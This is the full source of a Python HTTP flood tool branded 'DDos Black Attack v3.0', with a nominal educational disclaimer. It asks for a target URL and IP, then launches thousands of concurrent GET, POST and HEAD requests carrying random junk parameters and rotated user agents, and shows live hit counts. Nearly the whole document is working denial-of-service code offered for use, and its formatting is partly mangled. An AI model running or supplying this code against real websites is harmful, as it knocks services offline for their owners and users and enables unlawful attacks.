DDos Black Attack v3.0

Developer: Safwan Al-Sadaf

Tool Type: Real HTTP Flooder (VPN Required)

Disclaimer: This tool is for educational purposes only. Developer holds no responsibility for any misuse.

import asyncio import random import ssl import sys import os import time from aiohttp import ClientSession, TCPConnector from urllib.parse import urlparse, quote

class DDosBlackAttack: def init(self): self.target_url = "" self.host_ip = "" self.threads = 50000 self.users = 5000 self.running = True self.success = 0 self.failed = 0 self.methods = ['GET', 'POST', 'HEAD'] self.ssl_ctx = self.create_ssl_context()

def create_ssl_context(self):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx

def clear_screen(self):
    os.system('clear' if os.name != 'nt' else 'cls')

def show_banner(self):
    self.clear_screen()
    print("""


---

/ |  __ _ / |      ____ _ _ __
_ \ /  | |_\ \ /\ / / _ | ' \ ) | (| |  |\ V  V / (| | | | | |/ _,||   _/_/ _,|| ||

🔥 DDos Black Attack v3.0 🛠️  Developer : Safwan Al-Sadaf 🛠️  Threads   : 50000 🧑‍💻 Users     : 5000 ⚠️  VPN Required 📅  2025-06-17 """) print(""" 📜 Disclaimer: This tool is for educational purposes only. 📛 Developer is not responsible for any misuse. 💣 Quote: "When SQLi strikes silently, databases scream without a sound." """)

def setup(self):
    self.show_banner()
    self.target_url = input("[+] Enter target website URL: ").strip()
    self.host_ip = input("[+] Enter target host IP address: ").strip()

def generate_junk(self):
    return '&'.join([f'r{random.randint(1,99999)}={random.random()}' for _ in range(5)])

def generate_headers(self):
    ua_list = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Mozilla/5.0 (X11; Linux x86_64)',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X)',
        'Mozilla/5.0 (Linux; Android 10; SM-A105F)',
    ]
    return {
        'User-Agent': random.choice(ua_list),
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'Referer': 'https://google.com'
    }

async def http_flood(self, session, method):
    while self.running:
        try:
            if method == 'POST':
                async with session.post(self.target_url, data=self.generate_junk()) as resp:
                    await resp.read()
            else:
                async with session.request(method, f"{self.target_url}?{self.generate_junk()}") as resp:
                    await resp.read()
            self.success += 1
        except:
            self.failed += 1

async def live_stats(self):
    while self.running:
        print(f"\r[+] Sent: {self.success} | Failed: {self.failed}", end="")
        await asyncio.sleep(1)

async def attack_loop(self):
    connector = TCPConnector(ssl=self.ssl_ctx, limit=0)
    tasks = []
    async with ClientSession(connector=connector) as session:
        for _ in range(self.users):
            method = random.choice(self.methods)
            tasks.append(self.http_flood(session, method))
        tasks.append(self.live_stats())
        await asyncio.gather(*tasks)

def run(self):
    self.setup()
    print("\n[✓] Attack Started! Live stats below... (Ctrl+C to stop)\n")
    try:
        asyncio.run(self.attack_loop())
    except KeyboardInterrupt:
        self.running = False
        print("\n[!] Attack stopped by user.")
    print("\n[✓] Attack finished.")

if name == "main": tool = DDosBlackAttack() tool.run()
